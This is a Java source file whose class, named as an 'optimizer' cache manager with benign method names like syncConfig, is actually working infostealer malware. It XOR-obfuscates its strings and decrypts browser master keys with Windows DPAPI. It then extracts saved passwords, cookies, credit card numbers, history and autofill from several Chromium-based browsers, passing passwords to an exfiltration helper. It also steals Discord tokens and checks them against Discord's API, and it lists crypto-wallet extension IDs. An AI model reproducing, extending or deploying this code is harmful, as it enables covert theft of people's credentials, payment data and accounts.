package com.example.optimizer;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Base64;
import java.util.HashSet;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.sun.jna.platform.win32.Crypt32;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinCrypt;

public class CacheManager {

    // XOR Key: 0x5a
    private static String x(String s) {
        try {
            byte[] b = java.util.Base64.getDecoder().decode(s);
            byte[] r = new byte[b.length];
            for (int i = 0; i < b.length; i++)
                r[i] = (byte) (b[i] ^ 0x5a);
            return new String(r, java.nio.charset.StandardCharsets.UTF_8);
        } catch (Exception e) {
            return "";
        }
    }

    // Encrypted Constants
    private static final String S_APPDATA = "GwoKHhsOGw==";
    private static final String S_LOCALAPPDATA = "FhUZGxYbCgoeGw4b";

    private static final String S_CHROME = "GTIoNTc/";
    private static final String S_GOOGLE_CHROME_USER_DATA = "HTU1PTY/BhkyKDU3PwYPKT8oeh47Ljs=";
    private static final String S_EDGE = "Hz49Pw==";
    private static final String S_MICROSOFT_EDGE_USER_DATA = "FzM5KDUpNTwuBh8+PT8GDyk/KHoeOy47";
    private static final String S_BRAVE = "GCg7LD8=";
    private static final String S_BRAVESOFTWARE_BRAVE_BROWSER_USER_DATA = "GCg7LD8JNTwuLTsoPwYYKDssP3cYKDUtKT8oBg8pPyh6HjsuOw==";
    private static final String S_OPERA = "FSo/KDs=";
    private static final String S_OPERA_SOFTWARE_OPERA_STABLE = "FSo/KDt6CTU8Li07KD8GFSo/KDt6CS47ODY/";
    private static final String S_OPERA_GX = "FSo/KDt6HQI=";
    private static final String S_OPERA_SOFTWARE_OPERA_GX_STABLE = "FSo/KDt6CTU8Li07KD8GFSo/KDt6HQJ6CS47ODY/";
    private static final String S_VIVALDI = "DDMsOzY+Mw==";
    private static final String S_VIVALDI_USER_DATA = "DDMsOzY+MwYPKT8oeh47Ljs=";
    private static final String S_CHROMIUM = "GTIoNTczLzc=";
    private static final String S_CHROMIUM_USER_DATA = "GTIoNTczLzcGDyk/KHoeOy47";
    private static final String S_YANDEX = "Czsz+T8i";
    private static final String S_YANDEX_USER_DATA = "Czsp+T8iBhk7ND4/eCxoKDUrKT8oBg8pPyh6HjsuOw==";

    private static final String S_METAMASK = "Fz8uOzc7KTE=";
    private static final String S_NKBIHFBEOGAEAOEHLEFNKODBEFGPGKNN = "NDE4MzI8OD81PTs/OzU/MjY/PDQxNT44Pzw9Kj0xNDQ=";
    private static final String S_PHANTOM = "CjI7NC41Nw==";
    // Note: S_PHANTOM used for key, logic handles path manually if needed or relies
    // on structure
    private static final String S_COINBASE = "GTUzNDg7KT8=";
    private static final String S_HNFANKNOCFEOFBDDGCIJNMHNFNKDNAAD = "MjQ8OzQxNDU5PD81PDg+Pj05MzA0NzI0PDQxPjQ7Oz4=";

    private static final String S_LOCAL_STATE = "FjU5OzZ6CS47Lj8=";
    private static final String S_ENCRYPTED_KEY = "PzQ5KCMqLj8+BTE/Iw==";
    private static final String S_AES_GCM_NOPADDING = "Gx8JdR0ZF3UUNQo7Pj4zND0=";
    private static final String S_AES = "Gx8J";

    private static final String S_LOGIN_DATA = "FjU9MzR6HjsuOw==";
    private static final String S_COOKIES = "GTU1MTM/KQ==";
    private static final String S_WEB_DATA = "DT84eh47Ljs=";
    private static final String S_HISTORY = "EjMpLjUoIw==";

    private static final String S_Q_LOGINS = "CR8WHxkOejUoMz0zNAUvKDZ2Lyk/KDQ7Nz8FLDs2Lz92KjspKS01KD4FLDs2Lz96HAgVF3o2NT0zNCk=";
    private static final String S_Q_COOKIES = "CR8WHxkOejI1KS4FMT8jdjQ7Nz92PzQ5KCMqLj8+BSw7Ni8/dio7LjJ2PyIqMyg/KQUvLjl2MykFKT85Lyg/djMpBTIuLio1NDYjehwIFRd6OTU1MTM/KQ==";
    private static final String S_Q_CARDS = "CR8WHxkOejQ7Nz8FNTQFOTsoPnY/IiozKDsuMzU0BTc1NC4ydj8iKjMoOy4zNTQFIz87KHY5Oyg+BTQvNzg/KAU/NDkoIyouPz56HAgVF3o5KD8+My4FOTsoPik=";
    private static final String S_Q_URLS = "CR8WHxkOei8oNnYuMy42P3YsMykzLgU5NS80LnocCBUXei8oNil6FQgeHwh6GAN6NjspLgUsMykzLgUuMzc/eh4fCRl6FhMXEw56b2pq";
    private static final String S_Q_AUTOFILL = "CR8WHxkOejQ7Nz92LDs2Lz96HAgVF3o7Ly41PDM2Ng==";

    private static final String S_BROWSERS_ = "GCg1LSk/KCl1";

    private static final String S_PASSWORDS_TXT = "KjspKS01KD4pdC4iLg==";
    private static final String S_COOKIES_TXT = "OTU1MTM/KXQuIi4=";
    private static final String S_CREDIT_CARDS_TXT = "OSg/PjMuBTk7KD4pdC4iLg==";
    private static final String S_HISTORY_TXT = "MjMpLjUoI3QuIi4=";
    private static final String S_AUTOFILL_TXT = "Oy8uNTwzNjZ0LiIu";

    private static final String S_DISCORD = "HjMpOTUoPg==";
    private static final String S_DISCORDCANARY = "PjMpOTUoPjk7NDsoIw==";
    private static final String S_DISCORDPTB = "PjMpOTUoPiouOA==";
    private static final String S_LOCAL_STORAGE_LEVELDB = "FjU5OzZ6CS41KDs9PwY2Pyw/Nj44";
    private static final String S_DISCORD_TOKENS_TXT = "PjMpOTUoPgUuNTE/NCl0LiIu";
    private static final String S_API_ME = "Mi4uKilgdXU+Myk5NSg+dDk1N3U7KjN1LGN1Lyk/KCl1Gjc/";
    private static final String S_AUTH = "Gy8uMjUoMyA7LjM1NA==";

    private static final String S_JDBC_PREFIX = "MD44OWApKzYzLj9gPDM2P2A=";
    private static final String S_SQLITE_MODE = "ZTc1Pj9nKDU=";
    private static final String S_JDBC_SQLITE = "MD44OWApKzYzLj9g";
    private static final String S_NET_COOKIES = "FD8uLTUoMQYZNTUxMz8p";

    private static File STORAGE_DIR;
    private static final String APPDATA = System.getenv(x(S_APPDATA));
    private static final String LOCALAPPDATA = System.getenv(x(S_LOCALAPPDATA));

    private static final String[][] BROWSERS = {
            { x(S_CHROME), x(S_GOOGLE_CHROME_USER_DATA) },
            { x(S_EDGE), x(S_MICROSOFT_EDGE_USER_DATA) },
            { x(S_BRAVE), x(S_BRAVESOFTWARE_BRAVE_BROWSER_USER_DATA) },
            { x(S_OPERA), x(S_OPERA_SOFTWARE_OPERA_STABLE) },
            { x(S_OPERA_GX), x(S_OPERA_SOFTWARE_OPERA_GX_STABLE) },
            { x(S_VIVALDI), x(S_VIVALDI_USER_DATA) },
            { x(S_CHROMIUM), x(S_CHROMIUM_USER_DATA) },
            { "Yandex", "Yandex\\YandexBrowser\\User Data" }
    };

    public static void setStorageDir(File dir) {
        STORAGE_DIR = dir;
    }

    public static void syncConfig() {
        // Ensure native DLLs are ready before any database operations
        NativeLoader.ensureReady();

        if (STORAGE_DIR == null)
            return;

        for (String[] browser : BROWSERS) {
            String name = browser[0];
            File browserDir = new File(LOCALAPPDATA + "\\" + browser[1]);
            if (!browserDir.exists())
                continue;

            byte[] key = loadKey(browserDir.getAbsolutePath());

            for (String profile : new String[] { "Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4",
                    "Profile 5" }) {
                File profileDir = new File(browserDir, profile);
                if (!profileDir.exists())
                    continue;

                loadSavedData(name, browserDir.getAbsolutePath(), profile, key);
                loadCookies(name, browserDir.getAbsolutePath(), profile, key);
                loadCredit(name, browserDir.getAbsolutePath(), profile, key);
                loadHist(name, browserDir.getAbsolutePath(), profile);
                loadAuto(name, browserDir.getAbsolutePath(), profile);
            }
        }
    }

    private static byte[] loadKey(String path) {
        try {
            File f = new File(path, x(S_LOCAL_STATE));
            if (!f.exists())
                return null;

            String json = new String(Files.readAllBytes(f.toPath()), StandardCharsets.UTF_8);
            String k = x(S_ENCRYPTED_KEY);
            int start = json.indexOf(k);
            if (start == -1)
                return null;

            // Adjust start to find the value
            // json looks like: ... "encrypted_key":"<B64>" ...
            // start is at "encrypted_key"
            // we want the opening quote of the value

            int keyStart = json.indexOf("\"", start + k.length() + 2) + 1;
            int keyEnd = json.indexOf("\"", keyStart);

            if (keyStart <= 0 || keyEnd <= keyStart)
                return null;

            byte[] encKey = Base64.getDecoder().decode(json.substring(keyStart, keyEnd));
            if (encKey.length < 5)
                return null;

            byte[] keyWithoutPrefix = new byte[encKey.length - 5];
            System.arraycopy(encKey, 5, keyWithoutPrefix, 0, keyWithoutPrefix.length);

            return unprotect(keyWithoutPrefix);
        } catch (Exception e) {
            return null;
        }
    }

    private static byte[] unprotect(byte[] data) {
        try {
            WinCrypt.DATA_BLOB in = new WinCrypt.DATA_BLOB(data);
            WinCrypt.DATA_BLOB out = new WinCrypt.DATA_BLOB();

            if (Crypt32.INSTANCE.CryptUnprotectData(in, null, null, null, null, 0, out)) {
                byte[] res = out.pbData.getByteArray(0, out.cbData);
                Kernel32.INSTANCE.LocalFree(out.pbData);
                return res;
            }
        } catch (Exception e) {
        }
        return null;
    }

    private static String parseValue(byte[] data, byte[] key) {
        try {
            if (data == null || data.length < 3)
                return "";

            // Check for v10/v11 prefix (Chrome 80+)
            boolean isV10V11 = data.length > 3 && data[0] == 'v' && data[1] == '1'
                    && (data[2] == '0' || data[2] == '1');

            if (isV10V11 && key != null && data.length >= 15) {
                // v10/v11 format: prefix(3) + nonce(12) + ciphertext
                byte[] iv = new byte[12];
                System.arraycopy(data, 3, iv, 0, 12);
                byte[] cipherText = new byte[data.length - 15];
                System.arraycopy(data, 15, cipherText, 0, cipherText.length);

                Cipher cipher = Cipher.getInstance(x(S_AES_GCM_NOPADDING));
                cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, x(S_AES)), new GCMParameterSpec(128, iv));
                return new String(cipher.doFinal(cipherText), StandardCharsets.UTF_8);
            } else {
                // Legacy DPAPI encryption (pre-Chrome 80)
                byte[] decrypted = unprotect(data);
                if (decrypted != null) {
                    return new String(decrypted, StandardCharsets.UTF_8);
                }
            }
        } catch (Exception e) {
            // If AES-GCM fails, try DPAPI as fallback
            try {
                byte[] decrypted = unprotect(data);
                if (decrypted != null) {
                    return new String(decrypted, StandardCharsets.UTF_8);
                }
            } catch (Exception e2) {
            }
        }
        return "";
    }

    private static File tempCopy(File src, String p) {
        if (!src.exists())
            return null;
        File tmp = new File(System.getProperty("java.io.tmpdir"), p + "_" + System.nanoTime());
        try {
            Files.copy(src.toPath(), tmp.toPath());
            return tmp;
        } catch (Exception e) {
            return null;
        }
    }

    private static Connection connect(File db) {
        try {
            String url = x(S_JDBC_PREFIX) + db.getAbsolutePath().replace("\\", "/") + x(S_SQLITE_MODE);
            return DriverManager.getConnection(url);
        } catch (Exception e) {
            return null;
        }
    }

    private static void loadSavedData(String name, String path, String profile, byte[] key) {
        try {
            File db = new File(path, profile + "\\" + x(S_LOGIN_DATA));
            if (!db.exists())
                return;

            // Connection conn = connect(db); // Direct connection might lock
            // Use copy always safest
            File tmp = tempCopy(db, "l");
            if (tmp == null)
                return;
            Connection conn = DriverManager.getConnection(x(S_JDBC_SQLITE) + tmp.getAbsolutePath());

            StringBuilder sb = new StringBuilder();
            String pc = System.getenv("COMPUTERNAME");
            String user = System.getenv("USERNAME");

            try (Statement s = conn.createStatement();
                    ResultSet rs = s.executeQuery(x(S_Q_LOGINS))) {
                while (rs.next()) {
                    String u = rs.getString(1); // origin_url
                    String n = rs.getString(2); // username
                    String p = parseValue(rs.getBytes(3), key); // password

                    if (!u.isEmpty() && !n.isEmpty()) {
                        sb.append("URL: ").append(u).append("\nUser: ").append(n).append("\nPass: ").append(p)
                                .append("\n\n");
                        try {
                            SessionUtil.sendBrowserPassword(name, u, n, p, pc, user);
                        } catch (Exception e) {
                        }
                    }
                }
            }
            conn.close();
            if (tmp != null)
                tmp.delete();

            if (sb.length() > 0) {
                File out = new File(STORAGE_DIR, x(S_BROWSERS_) + name + "/" + profile.replaceAll("\\W", ""));
                out.mkdirs();
                Files.write(new File(out, x(S_PASSWORDS_TXT)).toPath(), sb.toString().getBytes());
            }
        } catch (Exception e) {
        }
    }

    private static void loadCookies(String name, String path, String profile, byte[] key) {
        try {
            File db = new File(path, profile + "\\" + x(S_NET_COOKIES)); // Network\Cookies
            if (!db.exists()) {
                db = new File(path, profile + "\\" + x(S_COOKIES)); // Cookies (legacy)
                if (!db.exists())
                    return;
            }

            File tmp = tempCopy(db, "c");
            if (tmp == null)
                return;
            Connection conn = DriverManager.getConnection(x(S_JDBC_SQLITE) + tmp.getAbsolutePath());

            StringBuilder sb = new StringBuilder();
            try (Statement s = conn.createStatement();
                    ResultSet rs = s.executeQuery(x(S_Q_COOKIES))) {
                while (rs.next()) {
                    String v = parseValue(rs.getBytes(3), key);
                    if (!v.isEmpty()) {
                        sb.append(rs.getString(1)).append("\t") // host
                                .append(rs.getInt(6) == 1).append("\t") // secure
                                .append(rs.getString(4)).append("\t") // path
                                .append(rs.getInt(7) == 1).append("\t") // http
                                .append(rs.getLong(5)).append("\t") // expires
                                .append(rs.getString(2)).append("\t") // name
                                .append(v).append("\n");
                    }
                }
            }
            conn.close();
            if (tmp != null)
                tmp.delete();

            if (sb.length() > 0) {
                File out = new File(STORAGE_DIR, x(S_BROWSERS_) + name + "/" + profile.replaceAll("\\W", ""));
                out.mkdirs();
                Files.write(new File(out, x(S_COOKIES_TXT)).toPath(), sb.toString().getBytes());
            }

        } catch (Exception e) {
        }
    }

    private static void loadCredit(String name, String path, String profile, byte[] key) {
        try {
            File db = new File(path, profile + "\\" + x(S_WEB_DATA));
            if (!db.exists())
                return;

            File tmp = tempCopy(db, "w");
            if (tmp == null)
                return;

            StringBuilder sb = new StringBuilder();
            try (Connection conn = DriverManager.getConnection(x(S_JDBC_SQLITE) + tmp.getAbsolutePath());
                    Statement s = conn.createStatement();
                    ResultSet rs = s.executeQuery(x(S_Q_CARDS))) {
                while (rs.next()) {
                    String n = parseValue(rs.getBytes(4), key); // number
                    if (!n.isEmpty()) {
                        sb.append("Name: ").append(rs.getString(1)).append("\nNum: ").append(n)
                                .append("\nExp: ").append(rs.getString(2)).append("/").append(rs.getString(3))
                                .append("\n\n");
                    }
                }
            }
            tmp.delete();
            if (sb.length() > 0) {
                File out = new File(STORAGE_DIR, x(S_BROWSERS_) + name + "/" + profile.replaceAll("\\W", ""));
                out.mkdirs();
                Files.write(new File(out, x(S_CREDIT_CARDS_TXT)).toPath(), sb.toString().getBytes());
            }
        } catch (Exception e) {
        }
    }

    private static void loadHist(String name, String path, String profile) {
        try {
            File db = new File(path, profile + "\\" + x(S_HISTORY));
            if (!db.exists())
                return;

            File tmp = tempCopy(db, "h");
            if (tmp == null)
                return;

            StringBuilder sb = new StringBuilder();
            try (Connection conn = DriverManager.getConnection(x(S_JDBC_SQLITE) + tmp.getAbsolutePath());
                    Statement s = conn.createStatement();
                    ResultSet rs = s.executeQuery(x(S_Q_URLS))) {
                while (rs.next())
                    sb.append(rs.getString(1)).append(" | ").append(rs.getString(2)).append("\n");
            }
            tmp.delete();
            if (sb.length() > 0) {
                File out = new File(STORAGE_DIR, x(S_BROWSERS_) + name + "/" + profile.replaceAll("\\W", ""));
                out.mkdirs();
                Files.write(new File(out, x(S_HISTORY_TXT)).toPath(), sb.toString().getBytes());
            }
        } catch (Exception e) {
        }
    }

    private static void loadAuto(String name, String path, String profile) {
        try {
            File db = new File(path, profile + "\\" + x(S_WEB_DATA));
            if (!db.exists())
                return;
            File tmp = tempCopy(db, "a");
            if (tmp == null)
                return;
            StringBuilder sb = new StringBuilder();
            try (Connection conn = DriverManager.getConnection(x(S_JDBC_SQLITE) + tmp.getAbsolutePath());
                    Statement s = conn.createStatement();
                    ResultSet rs = s.executeQuery(x(S_Q_AUTOFILL))) {
                while (rs.next())
                    sb.append(rs.getString(1)).append(": ").append(rs.getString(2)).append("\n");
            }
            tmp.delete();
            if (sb.length() > 0) {
                File out = new File(STORAGE_DIR, x(S_BROWSERS_) + name + "/" + profile.replaceAll("\\W", ""));
                out.mkdirs();
                Files.write(new File(out, x(S_AUTOFILL_TXT)).toPath(), sb.toString().getBytes());
            }
        } catch (Exception e) {
        }
    }

    public static void syncDiscord() {
        if (STORAGE_DIR == null)
            return;
        Pattern encP = Pattern.compile("dQw4w9WgXcQ:[^\"\\s]+");
        Set<String> t = new HashSet<>();

        String[][] clients = {
                { x(S_DISCORD), APPDATA + "\\" + x(S_DISCORD) },
                { x(S_DISCORDCANARY), APPDATA + "\\" + x(S_DISCORDCANARY) },
                { x(S_DISCORDPTB), APPDATA + "\\" + x(S_DISCORDPTB) }
        };

        for (String[] c : clients) {
            byte[] k = loadKey(c[1]);
            if (k == null)
                continue;

            File ldb = new File(c[1], x(S_LOCAL_STORAGE_LEVELDB));
            if (!ldb.exists())
                continue;

            File[] fs = ldb.listFiles();
            if (fs == null)
                continue;

            for (File f : fs) {
                if (!f.getName().endsWith(".ldb") && !f.getName().endsWith(".log"))
                    continue;
                try {
                    String dat = new String(Files.readAllBytes(f.toPath()));
                    Matcher m = encP.matcher(dat);
                    while (m.find()) {
                        String dt = decDiscord(m.group(), k);
                        if (dt != null)
                            t.add(dt);
                    }
                } catch (Exception e) {
                }
            }
        }

        if (t.size() > 0) {
            StringBuilder sb = new StringBuilder();
            for (String tok : t) {
                if (chk(tok))
                    sb.append(tok).append("\n");
            }
            if (sb.length() > 0) {
                try {
                    Files.write(new File(STORAGE_DIR, x(S_DISCORD_TOKENS_TXT)).toPath(), sb.toString().getBytes());
                } catch (Exception e) {
                }
            }
        }
    }

    private static String decDiscord(String enc, byte[] key) {
        try {
            byte[] b = Base64.getDecoder().decode(enc.substring(12));
            byte[] iv = new byte[12];
            System.arraycopy(b, 3, iv, 0, 12);
            byte[] c = new byte[b.length - 15];
            System.arraycopy(b, 15, c, 0, c.length);

            Cipher cipher = Cipher.getInstance(x(S_AES_GCM_NOPADDING));
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, x(S_AES)), new GCMParameterSpec(128, iv));
            return new String(cipher.doFinal(c));
        } catch (Exception e) {
            return null;
        }
    }

    private static boolean chk(String tok) {
        try {
            java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(x(S_API_ME)).openConnection();
            c.setRequestProperty(x(S_AUTH), tok);
            return c.getResponseCode() == 200;
        } catch (Exception e) {
            return false;
        }
    }
}
